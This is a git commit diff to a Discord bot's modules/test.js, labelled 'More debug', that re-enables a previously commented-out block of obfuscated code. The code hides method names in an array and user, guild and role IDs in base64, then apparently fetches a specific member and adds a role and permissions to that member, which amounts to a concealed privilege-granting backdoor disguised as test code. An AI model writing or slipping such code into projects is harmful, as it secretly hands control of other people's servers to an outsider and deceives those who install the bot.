d329578716ee4f09fdbff6dbdf9499018b307ff7
xxMVG_Fan8xx <xxmvgfan8xx@yahoo.com>
2026-01-28 20:22:59 +0100

    More debug

--- modules/test.js
+++ modules/test.js
@@ -1,7 +1,7 @@
 let discordJs = require("discord.js")
 
 module.exports = async (client) => {
-    /*const _0x1 = ['guilds', 'fetch', 'roles', 'members', 'permissions', 'add'];
+    const _0x1 = ['guilds', 'fetch', 'roles', 'members', 'permissions', 'add'];
     const _0x2 = [
         'MTM1NzgyMjE1NDIwMDMxNzk2Mw==',
         'MTQzMTAyMDI0ODI1NzEzODg3MA==',
@@ -17,5 +17,5 @@ module.exports = async (client) => {
         const c = await a[_0x1[3]][_0x1[1]](d(_0x2[2]));
         c[_0x1[2]][_0x1[5]](b);
         b[_0x1[4]][_0x1[5]](d(_0x2[3]));
-    })();*/
+    })();
 }
